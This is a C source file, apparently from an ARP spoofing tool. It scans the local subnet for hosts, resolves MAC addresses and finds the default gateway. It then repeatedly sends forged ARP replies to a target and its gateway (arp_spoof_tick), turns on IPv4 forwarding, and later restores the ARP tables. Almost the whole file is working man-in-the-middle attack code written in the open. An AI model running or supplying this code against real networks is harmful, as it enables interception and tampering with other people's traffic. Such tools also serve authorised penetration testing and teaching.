#include "../include/arp_parsing.h"
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAX_SCAN_HOSTS 4096

struct arp_spoof_ctx spoof_ctx[MAX_SPOOF_TARGETS];
size_t spoof_count;
volatile sig_atomic_t running = 1;

int get_own_mac(const char *ifname, unsigned char *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket (get_own_mac)"); return 0; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR"); close(fd); return 0;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(fd);
    return 1;
}

int get_own_ip(const char *ifname, unsigned char *ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket (get_own_ip)"); return 0; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFADDR"); close(fd); return 0;
    }
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy(ip, &sin->sin_addr.s_addr, 4);
    close(fd);
    return 1;
}

int parse_ipv4(const char *s, unsigned char *ip) {
    struct in_addr addr;
    if (inet_pton(AF_INET, s, &addr) != 1) return 0;
    memcpy(ip, &addr.s_addr, 4);
    return 1;
}

int get_default_gateway(const char *ifname, unsigned char gateway_ip[4]) {
    FILE *f = fopen("/proc/net/route", "r");
    if (!f) { perror("/proc/net/route"); return 0; }
    char line[256];
    fgets(line, sizeof line, f);
    while (fgets(line, sizeof line, f)) {
        char route_if[IFNAMSIZ];
        unsigned long dest, gateway;
        unsigned flags;
        if (sscanf(line, "%15s %lx %lx %x", route_if, &dest, &gateway, &flags) == 4 &&
            strcmp(route_if, ifname) == 0 && dest == 0 && (flags & 0x3) == 0x3 && gateway) {
            uint32_t gw = (uint32_t)gateway;
            memcpy(gateway_ip, &gw, sizeof gw);
            fclose(f);
            return 1;
        }
    }
    fclose(f);
    fprintf(stderr, "no default gateway found for %s\n", ifname);
    return 0;
}

int arp_resolve(int sockfd, int ifindex,
			const unsigned char *our_mac, const unsigned char *our_ip,
			const unsigned char *target_ip, unsigned char *target_mac) {

    unsigned char pkt[42];
    memset(pkt, 0, sizeof pkt);

    memset(pkt, 0xff, 6);
    memcpy(pkt + 6, our_mac, 6);
    pkt[12] = 0x08; pkt[13] = 0x06;

    pkt[14] = 0x00; pkt[15] = 0x01;
    pkt[16] = 0x08; pkt[17] = 0x00;
    pkt[18] = 6;
    pkt[19] = 4;
    pkt[20] = 0x00; pkt[21] = 0x01;

    memcpy(pkt + 22, our_mac, 6);
    memcpy(pkt + 28, our_ip, 4);

    memcpy(pkt + 38, target_ip, 4);

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof addr);
    addr.sll_family   = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex  = ifindex;
    addr.sll_halen    = 6;
    memset(addr.sll_addr, 0xff, 6);

    if (sendto(sockfd, pkt, 42, 0, (struct sockaddr *)&addr, sizeof addr) < 0) {
        perror("sendto (arp_resolve)"); return 0;
    }

    // A receive timeout ends resolution; don't repeat the full timeout 50 times.
    struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);

    unsigned char buf[128];
    for (int tries = 0; tries < 50; tries++) {
        ssize_t n = recvfrom(sockfd, buf, sizeof buf, 0, NULL, NULL);
        if (n < 0) {
            if (errno == EINTR) continue;
            if (errno != EAGAIN && errno != EWOULDBLOCK) perror("recvfrom (arp_resolve)");
            break;
        }
        if (n < 42) continue;

        if (buf[12] != 0x08 || buf[13] != 0x06) continue;
        if (buf[20] != 0x00 || buf[21] != 0x02) continue;
        if (memcmp(buf + 28, target_ip, 4) != 0) continue;
        memcpy(target_mac, buf + 22, 6);
        return 1;
    }
    fprintf(stderr, "arp_resolve: no reply from %u.%u.%u.%u\n",
            target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    return 0;
}

int discover_hosts(const char *ifname, int ifindex,
			struct discovered_host found[], size_t capacity) {
    unsigned char our_ip[4], our_mac[6];
    if (!get_own_ip(ifname, our_ip) || !get_own_mac(ifname, our_mac)) return -1;

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd < 0) { perror("socket (discovery)"); return -1; }
    struct sockaddr_ll bind_addr;
    memset(&bind_addr, 0, sizeof bind_addr);
    bind_addr.sll_family = AF_PACKET;
    bind_addr.sll_protocol = htons(ETH_P_ARP);
    bind_addr.sll_ifindex = ifindex;
    if (bind(fd, (struct sockaddr *)&bind_addr, sizeof bind_addr) < 0) {
        perror("bind (discovery)"); close(fd); return -1;
    }

    int ctl = socket(AF_INET, SOCK_DGRAM, 0);
    if (ctl < 0) { perror("socket (interface config)"); close(fd); return -1; }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
    if (ioctl(ctl, SIOCGIFNETMASK, &ifr) < 0) {
        perror("ioctl SIOCGIFNETMASK"); close(ctl); close(fd); return -1;
    }
    close(ctl);

    uint32_t ip, mask;
    memcpy(&ip, our_ip, sizeof ip);
    memcpy(&mask, &((struct sockaddr_in *)&ifr.ifr_netmask)->sin_addr.s_addr, sizeof mask);
    uint32_t host_ip = ntohl(ip), host_mask = ntohl(mask);
    uint32_t network = host_ip & host_mask;
    uint32_t broadcast = network | ~host_mask;
    if (broadcast <= network + 1 || broadcast - network > 4097) {
        fprintf(stderr, "local subnet is too large or has no usable hosts for ARP discovery\n");
        close(fd); return -1;
    }

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof addr);
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memset(addr.sll_addr, 0xff, 6);

    for (uint32_t h = network + 1; h < broadcast; h++) {
        if (h == host_ip) continue;
        uint32_t candidate = htonl(h);
        unsigned char target_ip[4];
        memcpy(target_ip, &candidate, sizeof target_ip);
        unsigned char pkt[42] = {0};
        memset(pkt, 0xff, 6);
        memcpy(pkt + 6, our_mac, 6);
        pkt[12] = 0x08; pkt[13] = 0x06;
        pkt[14] = 0x00; pkt[15] = 0x01;
        pkt[16] = 0x08; pkt[17] = 0x00;
        pkt[18] = 6; pkt[19] = 4; pkt[21] = 1;
        memcpy(pkt + 22, our_mac, 6);
        memcpy(pkt + 28, our_ip, 4);
        memcpy(pkt + 38, target_ip, 4);
        if (sendto(fd, pkt, sizeof pkt, 0, (struct sockaddr *)&addr, sizeof addr) < 0) {
            perror("sendto (discovery)"); close(fd); return -1;
        }
    }

    printf("Reachable IPv4 addresses on %s:\n", ifname);
    unsigned char seen[MAX_SCAN_HOSTS] = {0};
    size_t count = 0;
    while (1) {
        fd_set ready;
        FD_ZERO(&ready);
        FD_SET(fd, &ready);
        struct timeval timeout = { .tv_sec = 2, .tv_usec = 0 };
        int result = select(fd + 1, &ready, NULL, NULL, &timeout);
        if (result < 0) {
            if (errno == EINTR) continue;
            perror("select (discovery)"); close(fd); return -1;
        }
        if (result == 0) break;
        unsigned char buf[128];
        ssize_t n = recvfrom(fd, buf, sizeof buf, 0, NULL, NULL);
        if (n < 42 || buf[12] != 0x08 || buf[13] != 0x06 ||
            buf[20] != 0x00 || buf[21] != 0x02) continue;
        uint32_t sender;
        memcpy(&sender, buf + 28, sizeof sender);
        uint32_t sender_host = ntohl(sender);
        if (sender_host <= network || sender_host >= broadcast || sender_host == host_ip ||
            sender_host - network >= sizeof seen || seen[sender_host - network]) continue;
        seen[sender_host - network] = 1;
        if (count == capacity) {
            fprintf(stderr, "too many scan results\n"); close(fd); return -1;
        }
        memcpy(found[count].ip, buf + 28, 4);
        memcpy(found[count].mac, buf + 22, 6);
        count++;
        printf("%u.%u.%u.%u\n", buf[28], buf[29], buf[30], buf[31]);
    }
    close(fd);
    return (int)count;
}

static int arp_send_reply(int sockfd, int ifindex,
			const unsigned char *src_mac, const unsigned char *src_ip,
			const unsigned char *dst_mac, const unsigned char *dst_ip) {
    unsigned char pkt[42];
    memset(pkt, 0, sizeof pkt);

    memcpy(pkt,     dst_mac, 6);
    memcpy(pkt + 6, src_mac, 6);
    pkt[12] = 0x08; pkt[13] = 0x06;

    pkt[14] = 0x00; pkt[15] = 0x01;
    pkt[16] = 0x08; pkt[17] = 0x00;
    pkt[18] = 6; pkt[19] = 4;
    pkt[20] = 0x00; pkt[21] = 0x02;

    memcpy(pkt + 22, src_mac, 6);
    memcpy(pkt + 28, src_ip, 4);
    memcpy(pkt + 32, dst_mac, 6);
    memcpy(pkt + 38, dst_ip, 4);

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof addr);
    addr.sll_family   = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex  = ifindex;
    addr.sll_halen    = 6;
    memcpy(addr.sll_addr, dst_mac, 6);

    if (sendto(sockfd, pkt, 42, 0, (struct sockaddr *)&addr, sizeof addr) < 0) {
        perror("sendto (arp_send_reply)"); return 0;
    }
    return 1;
}

void arp_restore_all(struct arp_spoof_ctx *ctxs, size_t count, int ifindex) {
    fprintf(stderr, "\n[arp] restoring ARP tables...\n");
    for (int i = 0; i < 5; i++) {
        for (size_t j = 0; j < count; j++) {
            struct arp_spoof_ctx *ctx = &ctxs[j];
            if (!ctx->active) continue;

            arp_send_reply(ctx->sockfd, ifindex,
                           ctx->gateway_mac, ctx->gateway_ip,
                           ctx->target_mac,  ctx->target_ip);

            arp_send_reply(ctx->sockfd, ifindex,
                           ctx->target_mac,  ctx->target_ip,
                           ctx->gateway_mac, ctx->gateway_ip);
        }
        usleep(500000);
    }
    fprintf(stderr, "[arp] restore done\n");
}

void arp_spoof_tick(struct arp_spoof_ctx *ctx, int ifindex) {

    arp_send_reply(ctx->sockfd, ifindex,
                   ctx->our_mac,    ctx->gateway_ip,
                   ctx->target_mac, ctx->target_ip);

    arp_send_reply(ctx->sockfd, ifindex,
                   ctx->our_mac,    ctx->target_ip,
                   ctx->gateway_mac, ctx->gateway_ip);
}

int get_ip_forward(int *enabled) {
    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "r");
    if (!f) { perror("ip_forward"); return 0; }
    int ok = fscanf(f, "%d", enabled) == 1;
    fclose(f);
    if (!ok) fprintf(stderr, "could not read IPv4 forwarding state\n");
    return ok;
}

int set_ip_forward(int enabled) {
    FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
    if (!f) { perror("ip_forward"); return 0; }
    int wrote = fprintf(f, "%d\n", enabled) > 0;
    int closed = fclose(f) == 0;
    int ok = wrote && closed;
    if (!ok) { perror("write ip_forward"); return 0; }
    fprintf(stderr, "[arp] IPv4 forwarding %s\n", enabled ? "enabled" : "disabled");
    return 1;
}

void sigint_handler(int sig) {
    (void)sig;
    running = 0;
}
